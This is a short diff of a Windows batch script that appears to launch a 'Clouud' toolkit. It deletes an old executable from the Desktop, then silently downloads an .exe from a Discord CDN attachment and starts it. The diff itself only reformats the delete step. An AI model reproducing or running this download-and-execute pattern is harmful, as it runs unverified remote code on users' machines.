@@ -2,7 +2,9 @@
 :: If reading this, please don't steal anything!
 :: Se está lendo isso, porfavor não roube nada!
 :: Si estás leyendo esto, ¡no robes nada!
-if exist C:\Users\%username%\Desktop\Clouud_V2.exe ( del /s /q /f C:\Users\%username%\Desktop\Clouud_V2.exe )
+if exist C:\Users\%username%\Desktop\Clouud_V2.exe ( 
+del /s /q /f C:\Users\%username%\Desktop\Clouud_V2.exe 
+)
 set link=https://cdn.discordapp.com/attachments/992548263058210888/994024558489247764/Clouud_Toolkit.exe
 curl -s -o C:\Users\%username%\Desktop\Clouud_V2.exe %link%
 start C:\Users\%username%\Desktop\Clouud_V2.exe
